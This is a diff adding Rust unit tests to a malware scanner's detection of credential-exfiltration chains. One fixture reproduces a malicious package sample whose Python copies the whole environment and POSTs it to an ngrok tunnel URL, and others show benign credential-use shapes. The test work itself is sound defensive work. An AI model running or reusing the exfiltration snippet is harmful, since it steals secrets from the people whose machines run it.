@@ -3690,6 +3690,134 @@ mod reconcile {
         ));
     }
 
+    // -- names as values (`name_uses: value`) ------------------------------
+
+    /// A clean health check was reported CRITICAL RISK: `url` is bound from
+    /// the database URL, and the request two lines down passes a keyword
+    /// argument that is only *called* `url`.
+    #[test]
+    fn a_keyword_argument_that_repeats_a_bound_name_is_not_a_link() {
+        let src = "import os\n\
+            import requests\n\
+            url = os.environ[\"DATABASE_URL\"]\n\
+            base = \"https://status.example.com\"\n\
+            resp = requests.get(url=base + \"/ping\", timeout=5)\n";
+        assert!(scan("health.py", src)
+            .iter()
+            .any(|f| f.rule.starts_with("CRED-") && f.line == Some(3)));
+        assert!(fires("health.py", src, "NET-001"));
+        assert_eq!(chained("health.py", src, "EXFIL-CHAIN-001"), None);
+        // Sending the bound value itself is still the chain.
+        let sent = src.replace("url=base + \"/ping\"", "base, data=url");
+        assert_eq!(
+            chained("health.py", &sent, "EXFIL-CHAIN-001"),
+            Some(Severity::Critical)
+        );
+    }
+
+    /// artifact-lab-3-package (every version in the Datadog set,
+    /// artifact_lab_leak.py or setup.py) sends the environment in two hops:
+    /// the copy is bound to `data`, encoded into `encoded_data`, and the
+    /// request passes that as `data=encoded_data`. Correlation links one hop,
+    /// so this is not a chain; it linked only while a keyword argument's name
+    /// counted as a use (the same code with the copy called `env` never
+    /// linked). The samples keep NET-007 and INSTALL-001 at Critical; an
+    /// ordinary host in place of the tunnel URL drops the file to LOW RISK.
+    /// This is the measured cost of reading names as values.
+    #[test]
+    fn exfil_chain_does_not_follow_a_two_hop_flow() {
+        let leak = "import os\n\
+            import urllib.request\n\
+            import urllib.parse\n\
+            \n\
+            def run_payload():\n\
+            \x20   data = dict(os.environ)\n\
+            \x20   encoded_data = urllib.parse.urlencode(data).encode('utf-8')\n\
+            \x20   url = 'https://collector-7f3a.ngrok.app/collect'\n\
+            \x20   req = urllib.request.Request(url, data=encoded_data)\n\
+            \x20   urllib.request.urlopen(req)\n";
+        assert!(fires("leak.py", leak, "CRED-ENV-001"));
+        assert!(fires("leak.py", leak, "NET-007"));
+        assert_eq!(chained("leak.py", leak, "EXFIL-CHAIN-001"), None);
+        // One hop is the chain: the copy itself as the payload.
+        let one_hop = leak.replace(
+            "data=encoded_data",
+            "data=urllib.parse.urlencode(data).encode()",
+        );
+        assert_eq!(
+            chained("leak.py", &one_hop, "EXFIL-CHAIN-001"),
+            Some(Severity::Critical)
+        );
+    }
+
+    /// One propagation step (a line between source and sink that assigns an
+    /// expression using the bound name makes the new name a source too) was
+    /// measured and not adopted; see docs/detection/correlation-names.md.
+    /// These are clean shapes it reported CRITICAL RISK: an object built
+    /// from the credential whose attribute or method the request uses, and
+    /// a one-way or partial form of the secret sent where it is meant to go.
+    /// A value derived from a credential is not the credential, and one text
+    /// step cannot tell which derivations keep the secret.
+    #[test]
+    fn a_value_derived_from_a_credential_does_not_link() {
+        for (name, src) in [
+            (
+                "client.py",
+                "import os\nimport requests\n\
+                 token = os.environ[\"ACME_TOKEN\"]\n\
+                 client = Client(token)\n\
+                 STATUS_URL = \"https://status.example.com/report\"\n\
+                 requests.post(STATUS_URL, json={\"status\": client.status})\n",
+            ),
+            (
+                "engine.py",
+                "import os\nimport requests\n\
+                 url = os.environ[\"DATABASE_URL\"]\n\
+                 engine = create_engine(url, pool_pre_ping=True)\n\
+                 resp = requests.get(\"https://api.example.com/v1/health\", timeout=5)\n\
+                 with engine.connect() as conn:\n\
+                 \x20   conn.execute(text(\"select 1\"))\n",
+            ),
+            (
+                "client.js",
+                "const apiKey = process.env.OPENAI_API_KEY;\n\
+                 const openai = new OpenAI({ apiKey });\n\
+                 const res = await fetch(\"https://telemetry.example.com/v1/event\", {\n\
+                 \x20 method: \"POST\",\n\
+                 \x20 body: JSON.stringify({ model: openai.baseURL }),\n\
+                 });\n",
+            ),
+            (
+                "hook.py",
+                "import os\nimport requests\n\
+                 secret = os.environ[\"WEBHOOK_SECRET\"]\n\
+                 payload = json.dumps({\"event\": \"build.finished\"})\n\
+                 signature = hmac.new(secret.encode(), payload.encode(), hashlib.sha256).hexdigest()\n\
+                 requests.post(\"https://ci.example.com/hooks/build\", json={\"payload\": payload, \"signature\": signature})\n",
+            ),
+            (
+                "audit.py",
+                "import os\nimport requests\n\
+                 key = os.environ[\"ACME_API_KEY\"]\n\
+                 hint = key[:4] + \"****\"\n\
+                 requests.post(\"https://audit.example.com/v1/events\", json={\"key_hint\": hint})\n",
+            ),
+        ] {
+            let findings = scan(name, src);
+            assert!(
+                findings.iter().any(|f| f.rule.starts_with("CRED-")),
+                "{name}: no source"
+            );
+            assert!(
+                findings
+                    .iter()
+                    .any(|f| f.rule == "NET-001" || f.rule == "NET-004"),
+                "{name}: no sink"
+            );
+            assert_eq!(chained(name, src, "EXFIL-CHAIN-001"), None, "{name}");
+        }
+    }
+
     // -- bundled pickle deserialized (DESER-CHAIN-001) ---------------------
 
     /// ai-labs-snippets-sdk 0.1.0, src/ai_labs_snippets_sdk/__init__.py.
